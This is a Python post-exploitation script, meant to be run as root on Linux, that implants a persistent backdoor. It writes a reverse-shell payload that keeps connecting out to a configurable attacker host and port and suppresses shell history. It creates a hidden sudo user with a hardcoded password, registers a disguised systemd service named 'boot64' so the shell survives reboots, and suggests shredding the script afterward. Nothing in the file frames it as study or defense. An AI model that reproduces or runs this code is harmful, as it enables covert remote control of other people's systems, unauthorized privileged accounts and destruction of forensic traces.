#! /usr/bin/python3
import subprocess
import os
from pathlib import Path

# RUN AS ROOT

homeUser = str(Path.home())
homeUser = homeUser.split("/")[-1]

print("Going ham on {}".format(homeUser))

boot64="""
#! /usr/bin/python3
from time import sleep
import pty
import socket
import os

lhost = "127.0.0.1" # XXX: CHANGEME
lport = 31337  # XXX: CHANGEME

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((lhost, lport))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    os.putenv("HISTFILE",'/dev/null')
    pty.spawn("/bin/sh")
    s.close()

if __name__ == "__main__":
    while 1:
        try:
            while 1:
                sleep(5)
                main()
        except Exception as e:
            print(e)
"""

backdoor = """
#!/bin/bash

PASSWORD="sickkick"
USERNAME="sysd"

if id -u "$USERNAME" >/dev/null 2>&1; then
    userdel -r -f $USERNAME
    useradd -m -p $PASSWORD -s /bin/bash $USERNAME
    usermod -a -G sudo $USERNAME
    echo $USERNAME:$PASSWORD | chpasswd

else
    useradd -m -p $PASSWORD -s /bin/bash $USERNAME
    usermod -a -G sudo $USERNAME
    echo $USERNAME:$PASSWORD | chpasswd
fi
"""

persistence = """
[Unit]
Description=boot64
After=network.target

[Service]
ExecStart=/usr/bin/python3 /opt/boot64/boot64.py
ExecReload=/bin/kill -HUP $MAINPID
KillMode=process
IgnoreSIGPIPE=true
Restart=always
RestartSec=3
Type=simple

[Install]
WantedBy=multi-user.target
"""

with open("inject.sh", "w+") as file:
    file.write(backdoor)

os.system("chmod +x inject.sh")
os.system("./inject.sh")
print("Created sudo user")
os.system("rm inject.sh")
print("Cleaned up backdoor")

# ---------- Persistence
print("Gaining persistence through systemd...")
os.system("mkdir /opt/boot64")

with open("/opt/boot64/boot64.py", "w+") as file:
    file.write(boot64)

with open("/lib/systemd/system/boot64.service", "w+") as file:
    file.write(persistence)

os.system("chown -R {} /opt/boot64/".format(homeUser))
os.system("systemctl enable boot64.service && systemctl start boot64.service")
print("Boot64 injected into boot")
print("Use this to cleanup: shred -v -n 25 -u -z inject.py")
print("Done!")
